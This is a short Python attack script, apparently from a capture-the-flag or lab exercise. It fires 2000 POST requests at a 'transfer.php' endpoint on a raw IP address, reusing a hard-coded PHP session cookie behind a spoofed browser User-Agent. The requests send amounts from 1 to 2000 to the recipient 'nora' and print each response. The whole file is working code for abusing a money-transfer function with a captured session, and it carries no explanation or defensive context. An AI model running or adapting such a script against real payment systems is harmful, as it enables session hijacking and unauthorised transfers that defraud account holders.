import requests

url = 'http://45.122.249.68:20009/transfer.php'
headers = {
    'Host': '45.122.249.68:20009',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36',
    'Referer': 'http://45.122.249.68:20009/transfer.php',
    'Cookie': 'PHPSESSID=d1d78f5ceb38199228ae1e894a4a8dc6',
    'Connection': 'close'
}

for i in range(1, 2001):
    data = {
        'recipient': 'nora',
        'amount': str(i)
    }
    response = requests.post(url, headers=headers, data=data)
    print(f'Response for amount={i}: {response.text}')
